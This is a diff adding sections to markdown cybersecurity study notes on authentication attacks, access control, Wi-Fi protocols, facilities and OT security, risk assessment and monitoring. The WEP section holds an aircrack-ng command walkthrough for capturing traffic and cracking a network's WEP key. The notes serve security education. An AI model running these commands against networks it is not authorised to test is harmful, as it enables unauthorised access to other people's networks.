@@ -213,6 +213,26 @@ It is often used in places offering a public Wifi (cafés, airports...).
 
 **Bluesnarfing** is the unauthorized access of information from a wireless device over a Bluetooth connection.
 
+### Authentication Attacks
+
+### Spoofing
+
+Spoofing is a software-based attack where the attacker assumes the identity of a user or process.  
+It is used to bypass authentication by pretending to be a trusted party.  
+It is also used to establish a Man-in-the-Middle attack by sitting in the middle of 2 machines communicating,
+and pretending to both of them to be the other machine.
+
+### Credentials stuffing
+
+Credentials stuffing happens after some user/passwords leak from a website.  
+An attacker can use these credentials on other websites and services to access accounts of people using the same password.
+
+### Broken Authentication
+
+Broken authentication is a generic type of attacks exploiting a vulnerability in the application design.  
+It can be weak password policy, weak password recovery policy, easily guessable session keys, hardcoded passwords...
+
+
 ### Phishing
 
 Phishing is a social engineering technique to lure someone into willingly providing critical information (credentials, credit card numbers...).    
@@ -379,6 +399,23 @@ Networks that still use modems can protect against war dialing by setting a call
 Instead of opening a connection on a call, the modem hangs up and calls back to initiate a connection only if the caller ID is identified.  
 The best remediation is still to get rid of modems and use SSH access for remote connection instead.
 
+### Hashing Attacks
+
+#### Pass the Hash
+
+In a Pass-the-Hash attack, the attacker steals the hash and sends it directly to a server instead of the password.  
+The hash can be stolen either from a database or sniffed on the network.  
+It allows to impersonate the user in servers that use the hash as an authentication input.  
+
+**Mimikatz** is a penetration testing tool that automates the harvesting of hashes and the Pass-the-Hash attack.
+
+#### Birthday Attack
+
+The birthday attack consists in finding some passwords generating collisions with existing user passwords.  
+This allows to login to the  system using an incorrect password that generates the same hash.  
+To prevent it, we should use a longer digest limiting the collisions (like SHA-256 over MD5 for example).
+
+
 ## Emails
 
 ### Protocols
@@ -454,10 +491,8 @@ It is a command-line tool, and it offers the **Zenmap** GUI in KaliLinux.
 **Nessus** is the most popular tool to detect vulnerabilities on running machines.  
 - can create custom policies and finetune a lot of parameters for host discovery, port scanning, services discovery...
 - can run scan using custom policies of default scan types
-- detailled report on all vulnerabilities found and how to solve them
+- detailed report on all vulnerabilities found and how to solve them
 - uses plugin regularly updated to detect vulnerabilities
-
-
 
 
 ## Security Applications and Devices
@@ -523,7 +558,6 @@ Unlike an EPP, a UTM system protect an entire network, not a specific machine.
 
 Those are decoy servers and networks with intentional security flaws to attract attacks.  
 They keep attackers away from the real routers and servers, and allow to analyze the attacks (types, IPs, ...)
-
 
 
 ## Cloud Security
@@ -629,12 +663,66 @@ All important data must be saved in a backup (for example Windows 10 full system
 A files backup can be either on external drive or on the cloud (Google Drive, DropBox). 
 
 
-### MFA (Multi-Factor Authentication)
+### Authentication
+
+#### MFA (Multi-Factor Authentication)
 
 MFA is an authentication technique that requires multiple types of identity proofs :
 - **what we know** : password, PIN
 - **what we have** : token, access card
 - **what we are** : biometrics (fingerprints, DNA, voice, gait, retina)
+  - FAR (False Acceptance Rate) : how often the system accepts an unauthorized user
+  - FRR (False Rejection Rate) : how often the system rejects an authorized user
+  - CER (Crossover Error Rate) : rate where FAR == FRR
+- **where we are** : geographical region of the authentication request
+- **what we do** : writing a signature or performing any action
+
+#### Authentication methods
+
+**Context-aware authentication** is an authentication method taking into account the location or time to allow
+or deny the authentication request.
+
+**SSO** (Single Sign-On) is an authentication method where a default user profile is created for each user and linked
+with all the required resources.  
+This allows a user to have a single password to memorize giving access to multiple services.  
+The drawback is that compromised credentials cause a big security breach, as they give access to all services.
+
+With **FIM** (Federation Identity Management), a single identity is created for each user, and shared with
+all organizations in the federation.  
+FIM is a common set of policies and standards agreed by organizations for authentication.  
+The 2 main models for FIM to perform authentication and authorization are :
+- **Cross Certification** : web of trust between all organizations, only works for small number of organizations.
+- **Trusted 3rd Party** : all organizations place their trust in a single 3rd party
+  - **SAML** (Security Assertion Markup Language) : Attestation model built upon XML to share federated identity management information.  
+  It is a standardization of the SSO process.
+  - **OpenID** : Open standard and decentralized protocol to authenticate users in a FIM system.  
+  Users log to an Identity Provider (for ex Google) and use that account to authenticate on cooperative websites.
+
+
+### Access Control
+
+### Access Control Models
+
+With **DAC** (Discretionary Access Control), the access control is decided by the owner of each object (file, folder, device...).  
+It is commonly used because it gives great control but is not very scalable.  
+Each object must have an owner, and the owner must specify the permissions for each object he owns.
+
+With **MAC** (Mandatory Access Control), the access control policy is decided by the computer.  
+The decision is based on labels attached to each user and each object.  
+MAC is used in military context, with Unclassified / Confidential / Secret and TopSecret labels.  
+Each object has a secrecy label, and each user has a clearance level up to which he can access objects.  
+In military, there is also the concept of **need-to-know** that decides if a user should access an object.
+- **Rule-based implementation** : comparison of object and user labels (for example the clearance/secrecy)
+- **Lattice-based implementation** : complex mathematics defining interactions between objects and users (for example to include need-to-know)
+
+With **RBAC** (Role-Based Access Control), the access control policy is also decided by the computer.  
+The decision is based on a set of permissions instead of a single data label.  
+A role is created for each job function, and roles are assigned to users.  
+The permissions are set at role level, so there is no need to maintain user-level permissions.  
+RBAC is the most commonly used access control model in corporate networks.
+
+With **ABAC** (Attribute-Based Access Control), the access control is dynamic and context aware, using IF/ELSE statements.  
+It is one of the newest forms of access control and getting a lot of success recently.
 
 
 
@@ -762,7 +850,7 @@ They mimic traditional fuses and can be programmed or blown electronically (rath
 - **Trusted Firmware Updates** : firmware update that is digitally signed by the vendor and trusted by the system before installation.
 
 
-## SDLC (Software Developement Life Cycle)
+## SDLC (Software Development Life Cycle)
 
 SDLC is an organized process to develop secure software application.  
 The software goes through multiple steps in a waterfall model.  
@@ -800,11 +888,53 @@ However it implies the loss of the warranty and customer support, and official u
 ## Wireless Security
 
 Wireless access must encrypt its data and require authentication to access a network.  
-The successive protocols to encrypt data over a wireless connection are :
-- **WEP** (Wired Equivalent Privacy) : approved in 1999, very vulnerable and abandoned in 2004
-- **WPA** (Wifi Protected Access) : improvement of WEP but still exploitable
-- **WPA2** : Uses AES for encryption
-- **WPA3** launched in 2018 and supported by Wifi 6 compatible routers
+The successive protocols to encrypt data over a wireless connection are WEP, WPA, WPA2 and WPA3.
+
+#### WEP (Wired Equivalent Privacy)
+
+WEP was the original implementation of 802.11 standard.  
+It was approved in 1999, very vulnerable and abandoned in 2004 due to its security flaws.  
+Its main weakness is its 24-bit **IV** (Initialization Vector) sent in clear text.
+
+WEP can be cracked in a few minutes by IV attack using **aircrack-ng** or other wireless crackers.  
+For example on KaliLinux :
+```commandline
+// list wireless networks and their encryption, find one using WEP
+// Note down its channel and BSSID
+airodump-ng wlan0mon
+
+// Start scanning the target wireless network
+airodump-ng --channel <CHANNEL> --bssid <BSSID> --write MyHackedTraffic wlan0mon
+
+// Keep above command running and in another terminal send an auth request
+aireplay-ng --fakeauth 0 -a <BSSID> -h <wlan0mon MAC ADDRESS> wlan0mon
+
+// Get some ARP messages
+aireplay-ng --arpreplay -b <BSSID> -h <wlan0mon MAC ADDRESS> wlan0mon 
+
+// Crack the network using the IVs from the captured traffic
+// It will try to infer the WEP key from all captured IVs
+// It may fail if not enough data, it reruns every 5000 data captured by the scan 
+aircrack-ng MyHackedTraffic.cap
+```
+
+#### WPA (Wifi Protected Access) 
+
+WPA is an improvement of WEP, is uses **TKIP**, MIC (Message Integrity check) and **RC4** encryption.  
+WPA was a much better standard than WEP, but it had some flaws that WPA2 replaced. 
+
+#### WPA2
+
+WPA2 improves WPA by using **CCMP** for encryption, coupled with **AES** with a 128-bit key.
+
+#### WPA3
+
+WPA3 was launched in 2018 to strengthen WPA2.  
+The main improvement is the removal of the PSK (Pre-Shared Key) exchange used for encryption of all messages.  
+It was replaced by SAE (Simultaneous Authentication of Equals) where the client and the AP use public/private keys
+to agree on a one-time session key.  
+Thanks to SAE, WPA3 provides **forward secrecy** : past sessions are protected even if a future key is compromised.
+WPA3 is supported by Wifi 6 compatible routers.
 
 
 ## Domain Name Registrar
@@ -858,3 +988,275 @@ MacOS can read but not write to NTFS disks, and Windows does not even recognize 
 When a disk is formatted, the chosen FS governs which devices can read or write to the disk.  
 
 FAT32 and exFAT are a good choice when compatibility between OS is needed (flash drives, memory cards...). 
+
+
+## Facilities Security
+
+### Fire Suppression
+
+There are 5 types of fire : A, B, C, D and K :
+
+<p align="center">
+<img alt="Fire Types" src="../images/fire_types.jpg" width=400  style="border:1px solid black">
+</p>
+
+To protect employees, buildings, machines and data from fire, there are several fire suppression techniques.
+
+#### Handheld fire extinguisher
+
+There are multiple types of fire extinguisher :
+- **ABC extinguisher** : use dry-chemicals to extinguish fires of type A, B or C.  
+It is corrosive, so should be avoided on computers.
+- **BC extinguisher** : use CO2 to put off B and C fires.  
+It is safe to use on computers, but must be careful as it removes the O2 of the room so prevent humans to breathe.
+- **Yellow extinguisher** : put off class D metal fires
+
+#### Water Sprinkler
+
+A **wet-type** sprinkler contains water in its pipe at all time.  
+When a fire is detected, it releases the water to put off the fire.  
+It must not be used in areas where the temperature goes below zero, or the water would freeze in the pipes.
+
+In a **dry-pipe** sprinkler system, the pipes are filled with pressurized air.  
+When a fire is detected, it pushes water into the pipes to put off the fire.
+
+A **pre-action** sprinkler system is a variation of a dry-pipe sprinkler, but it activates when heat or smoke is detected
+(not only when the room is already on fire).
+
+#### Clean Agent
+
+In server rooms, we do not want to use a sprinkler system, as water would destroy all servers.  
+Instead, we use a clean agent system, that releases gaz into the room instead of water.    
+The gax (CO2, FM-200, HALON...) will replace the O2 and suffocate the fire.  
+This creates an environment where people cannot breathe, so usually an alarm rings before to signal people to leave the room.
+
+
+### HVAC (Heating, Ventilation and Air Conditioning)
+
+Servers can generate a lot of heat that must be dissipated, or servers may overheat and shutdown.  
+Each machine has its own fan to cool the processor, but in a server room the air will get hotter and an HVAC system is required to cool it down.
+
+Server rooms are organized as **hot and cold aisles** : server racks are facing each other, so the aisle with the front of servers is cold, and the aisle with the back of servers is hot.  
+This makes it easier to efficiently dissipate the heat.
+
+HVAC is also used to maintain a good humidity level of 40%.  
+Too little humidity can cause electrostatic discharge damaging components.  
+Too much humidity can cause condensation of water and corrosion of the components.
+
+### Faraday Cage
+
+A Faraday cage is a form of shielding installed around an entire room that prevents electromagnetic energy and radio frequencies from entering or leaving the room.  
+It can be used for example for forensic to turn on a phone and ensure no remote command is sent to it to delete its content.  
+
+### TEMPEST
+
+TEMPEST is a set of US government standards for the level of shielding required in a building to ensure emissions and interference cannot enter and exit the building.  
+Contractors working for the US government may have to follow these standards.  
+The TEMPEST-certified buildings are used to process classified, secret and top-secret information.
+
+### Vehicular Vulnerabilities
+
+Vehicles like cars and planes have built-in computers that are not well secure.  
+All messages inside the vehicle are part of the **CAN** (Controller Area Network) and are all trusted, there is no authentication in place.  
+
+If an attacker manages to send an instruction to the CAN bus, the instruction will be executed.  
+There are 3 main ways to do that :
+- attach the exploit to the **OBD-II** (On-Board Diagnostic), the system providing self-diagnosis and reporting capabilities for repair technicians
+- exploit over on-board cellular
+- exploit over on-board Wifi
+
+
+### OT (Operational Technology)
+
+Unlike IT centered about data networking, OT is designed to implement an industrial control system of physical components.  
+It is used in manufacturing, and instead of Windows machines they would use big cabinets with buttons and gauges.  
+Availability is extremely important for OT as the factory must have no downtime.  
+
+#### Embedded Systems
+
+A **PLC** (Programmable Logic Controller) is a type of computer designed for deployment in an industrial or outdoor
+setting that can automate and monitor mechanical systems.  
+For example, a PLC can be used to monitor the water flow and to open/close a valve.  
+A PLC can be patched to fix security issues, but patches are usually rare (once or twice a year).
+
+A **System-on-a-chip** is a processor that integrates the platform functionality of multiple logic controllers onto
+a single chip, replacing multiple big PLCs.  
+It is used by embedded systems like Roomba vacuum cleaners to save space.
+
+A **FPGA** (Field-Programmable Gate Array) is a processor that can be programmed to perform a specific function
+by the customer rather than at the time of manufacture.  
+This gives flexibility to the customer to configure a custom logic.
+
+A **RTOS** (Real-Time OS) is a type of OS that prioritizes deterministic execution of operations to ensure consistent
+response for time-critical tasks.  
+This type of OS is used by embedded systems that cannot tolerate reboots or crashes.
+
+#### ICS and SCADA
+
+An **ICS** (Industrial Control System) is a network managing embedded devices, used for electrical power stations,
+water suppliers, health services, manufacturing...  
+ICS uses **Fieldbus**, a digital serial data communications used in OT networks to link PLCs.
+
+An **HMI** (Human-Machine Interface) is an input and output control on a PLC to allow a user to configure and monitor the system.
+
+A **Data Historian** is a software that aggregates and catalogs data from multiple sources within an ICS.
+
+**SCADA** (Supervisory Control And Data Acquisition) is a type of ICS that manages large-scale, multi-site devices
+and equipment spread over a geographic region.  
+SCADA runs as software on computers to gather data from and manage plant devices and equipment with embedded PLCs.  
+It uses a WAN to gather all data from all plants to the central SCADA server.  
+For example, smart meters in a house monitor electricity consumption and send back this data to the central SCADA
+server of the electricity company.  
+
+**Modbus** is a communications protocol used in OT networks, it replaces the TCP/IP protocols used in IT.  
+Modbus gives control servers and SCADA hosts the ability to query and change the configuration of each PLC.
+
+Key controls to mitigate vulnerabilities in specialized systems :
+- establish administrative control over OT networks by recruiting staff with relevant expertise (not IT with TCP/IP)
+- implement the minimum network links (disable unnecessary links, services and protocols), OT network should be disconnected as much as possible from the IT network
+- develop and test a patch management program for the OT networks
+- perform regular audits of logical and physical access to detect vulnerabilities and  intrusions
+
+#### Premise System
+
+Many system designs allow the monitoring to be accessible from the corporate data network or the Internet, but it
+makes the main network more vulnerable.  
+It is usually a 3rd network in the organization (with the corporate data network and the SCADA network).
+
+**BAS** (Building Automation System) are components and protocols facilitating the centralized configuration and
+monitoring of mechanical and electrical systems within the office or the data center, for example the elevators,
+the battery backup system, the AC, the lights...  
+Many of these BAS are monitored via the internet and are vulnerable to code injection.
+
+**PACS** (Physical Access Control System) are components and protocols facilitating the centralized configuration
+and monitoring of security mechanism within the office or the data center, for example the security cameras, the card readers...  
+PACS can be integrated with the BAS, or be in a separate system.  
+PACS is often installed by an external supplier, and is often omitted from risk and vulnerabilities assessments.
+
+
+## Risk Assessment
+
+Risk assessment is a process used in risk management to identify risks in a network or system, and decide on how to address them.  
+A **risk** is the probability that a threat will be realized.  
+A **vulnerability** is any internal weakness in the system that can be exploited.  
+A **threat** is an external factor that can use a vulnerability to damage the system (disaster, hacker...).  
+
+There are 4 strategies to address a risk :
+- **Avoid** : change the strategy to eliminate the existence of the risk
+- **Transfer** : pass the risk to a 3rd party (insurance)
+- **Mitigate** : minimize the risk to an acceptable level (fix critical vulnerabilities, backups...)
+- **Accept** : accept the current level of risk
+
+**Qualitative risk analysis** uses intuition, experience and other methods to assign a relative value to a risk.  
+
+**Quantitative risk analysis** uses numerical and monetary values to calculate risk.  
+It uses functions to generate a magnitude of impact representing the damage of a risk :
+- **Single Loss Expectancy** : Cost associated with every single threat that can occur
+- **Annualized Rate of Occurrence** : Number of times per year the threat will be realized
+- **Annualized Loss Expectancy** : Expected cost of a threat over a year
+
+**Active assessments** use intrusive techniques like scanning, hands-on testing and probing the network.  
+They can possibly cause the crash or shutdown of some services or machines when an issue is found.  
+
+**Passive assessments** make use of open-source information and collection and analysis of network data.  
+They never make any direct contact with the target system. 
+
+### Types of security controls
+
+Security controls can be classified by control type :
+- **Physical** : guard, security camera, lock, security card, alarms ...
+- **Technical** : password, encryption, ACLs, MFA ...
+- **Administrative** : policies and procedures, least-privilege, mandatory vacation, user trainings...
+
+Security controls can also be classified following the NIST categories :
+- **Management** : focused on decision-making, like policies and procedures
+- **Operational** : actions done by people, like user training, testing recovery plans, ...
+- **Technical** : AAA, ACL, encryption, ...
+
+Security controls can also be classified by the time of the protection :
+- **Preventive** : controls preventing issues to happen, like RAID, UPS, ...
+- **Detective** : controls detecting issues happening, like alarms, IDS, logs...
+- **Corrective** : controls correcting issues after they happened, like backups, disaster recovery, ...
+
+Another type of security control is **compensative control**, set to replace a control that cannot be implemented yet.  
+For example, if we use retina scans for data centers but in one country they do not sell it, we use another solution instead.
+
+### Types of risk
+
+- **External** : coming from external sources, like fire, flood, hackers...
+- **Internal** : coming from within the organization, like server crash, legacy systems, ...
+- **Multi-party** : coming from multiple organizations or systems bringing their own risk
+- **Intellectual Property Theft** : theft of business assets or ideas
+- **Software compliance and licenses** : organization not aware of what software are running, software issues...
+
+### Vulnerability management
+
+Vulnerability management includes the vulnerability assessment, and the mitigation of these vulnerabilities.  
+Then they need to be prioritized, mitigated, and finally the scan must be performed again to confirm the resolution.
+
+A vulnerability assessment is the process of identifying issues in a system, network, database, application...  
+Vulnerabilities can be identified with a vulnerability scanning tool like **Nessus** and **QualysGuard**.  
+It is a defined process to identify and classify all vulnerabilities. 
+
+A vulnerability assessment comprises multiple domains :
+- **network scanning** : discover and document physical and logical connectivity in the network (NMap)
+- **vulnerability scanning** : identify threats on the network without exploiting them (open ports and program versions)
+- **network sniffing** : capture and analyze the network traffic on the network (WireShark)
+- **password analysis** : try to guess passwords with a password cracker (Cain & Abel, John The Ripper, HashCat)
+
+#### Penetration Testing
+
+Penetration testing is another way to identify vulnerabilities of a system.  
+Penetration testers can work in black, gray or white box to try to break the tested system.  
+Common penetration testing tools are **Metasploit** and **CANVAS**.  
+
+The **red team** is the team trying to attack the system, playing the role of the external hacker.  
+The **blue team** is the team defending the system, playing the role of the Systems team.  
+The **white team** is the team supervising the penetration testing exercise. 
+
+#### OVAL (Open Vulnerability and Assessment Language)
+
+OVAL is a language used to share data focused around vulnerability assessment and management between different tools.  
+
+
+## Monitoring and Auditing
+
+The **security posture** is the risk level to which a system or a technology element is exposed.
+
+**Baselining** is the process of measuring changes in networking, hardware, software and applications.  
+It defines what the normal state is, allowing to monitor for unusual activities (off-hours connection, traffic spikes...).  
+Performance baselining is the monitoring of CPU usage, bandwidth usage, number of processors in use, disk space usage...  
+It is useful for daily use, and also for security monitoring to detect abnormal activities that could come from malwares.  
+This can be monitored with the **Windows Performance Monitor** tool.
+
+**Protocol analyzers** are also used to monitor the packets circulating on the network.  
+It can be set in **promiscuous-mode** (capturing all packets) or **non-promiscuous mode** (capturing only packets addressed to it).  
+To have a full monitoring of the traffic on the network, we must use promiscuous mode, but not all network cards support it.  
+For the protocol analyzer to receive all traffic, it must be connected to a switch port using **port mirroring** to forward
+all traffic to it, or to use a **network tap**, a physical device allowing to intercept all the traffic between two points of the network.
+
+`openfiles` command on Windows can be used to monitor files open on the system.  
+`netstat` shows open connections on the machine.
+```commandline
+openfiles /local on       // enable the openfiles tracking (require admin privilege and a reboot)
+openfiles                 // list all open files with the process using it
+
+netstat -ano              // show current connections with UDP/TCP, IP address and port and process ID
+```
+
+### Logging
+
+There are 3 types of logs on a Windows machine accessible in the **Event Viewer** : 
+- **Security logs** : user login, administrative privilege granted...
+- **System logs** : startup and shutdown of the machine, Windows updates, NTP, DNS...
+- **Application logs** : activity of users
+
+An alternative to the Event Viewer is to use a Syslog server gathering all logs and offering a client to browser them.
+
+### SOAR (Security Orchestration, Automation and Response)
+
+SOAR are a type of security tools that facilitate incident response, threat hunting and security configuration by orchestrating
+automated runbooks.
+
+SOAR is a next-gen form of SIEM, it can scan security data, analyze it with ML, enrich it and provision resource in response.  
+For example it can teardown a VM suspected to contain a malware and create a new VM instead.
